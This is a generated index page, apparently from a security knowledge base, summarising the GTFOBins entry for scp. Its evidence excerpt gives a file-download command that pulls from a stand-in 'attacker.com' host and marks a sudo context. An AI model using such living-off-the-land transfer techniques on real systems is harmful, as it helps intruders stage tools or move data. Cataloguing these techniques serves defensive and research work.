---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# scp

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `scp` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/scp` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

GTFOBins entry for scp covering download, shell, upload.

## Fast Retrieval

- Platform: `linux`
- Command page: [commands](../../commands/linux/scp.md)
- Source verification: [source record](../../sources/gtfobins/scp.md)

## Aliases

- `scp`

## Source Verification

[source record](../../sources/gtfobins/scp.md)

## Evidence Excerpt

```text
_body: ''
_name: scp
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/scp
functions:
download:
- code: scp user@attacker.com:/path/to/input-file /path/to/output-file
contexts:
sudo: null
```
